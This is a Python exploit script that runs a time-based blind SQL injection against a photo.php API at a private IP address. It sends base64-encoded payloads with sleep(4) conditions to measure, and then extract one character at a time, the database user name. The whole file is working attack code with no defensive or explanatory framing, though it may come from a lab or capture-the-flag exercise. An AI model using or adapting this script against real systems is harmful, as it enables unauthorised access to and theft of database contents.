#!/usr/bin/env python
#-*- coding:utf-8 -*-
 
import requests
import time
import base64
from urllib import parse
import urllib.parse
 
url1 = "http://10.101.249.153:8080/photo/p/api/photo.php?ac="
url2 = "&album=cJinsP" 

 
 ##({} limit 0,1)


 
result = ''
length  = 0
for l in range(1,20):
	payload = "1|1 and if(length(user())={},sleep(4),1)|1".format(l)
	payload2 = str(base64.b64encode(payload.encode("utf-8")),"utf-8")
	payload2 = urllib.parse.quote(payload2)
	url = url1+payload2+url2
	stime =time.time()
		#print(url)
	r = requests.get(url)
	print(r.status_code)
	etime = time.time()
	if etime-stime >= 4:
		print("用户名长度是" + str(l))
		length = l+1
		


for i in range(1,length):
	for j in range(48,122):
		payload = "1|1 and if(ascii(substring(user(),{},1))>{},1,sleep(4))|1".format(i,j)
		payload2 = str(base64.b64encode(payload.encode("utf-8")),"utf-8")
		payload2 = urllib.parse.quote(payload2)
		url = url1+payload2+url2
		stime =time.time()
		
		#print(url)
		r = requests.get(url)
		etime = time.time()
		if etime-stime >= 4:
			#print(j)
			result += chr(j)
			print (result)
			break